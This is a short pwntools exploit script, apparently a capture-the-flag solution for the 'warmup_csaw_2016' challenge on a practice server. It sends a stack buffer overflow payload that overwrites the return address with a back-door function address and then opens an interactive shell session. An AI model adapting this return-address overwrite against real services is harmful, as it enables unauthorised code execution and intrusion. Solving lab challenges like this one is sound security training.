from pwn import *


# p = process("./warmup_csaw_2016")
p = remote("node4.buuoj.cn", 29084)

back_door = 0x0040060D

payload = cyclic(0x40+0x8)+p64(back_door)
p.sendline(payload)

p.interactive()

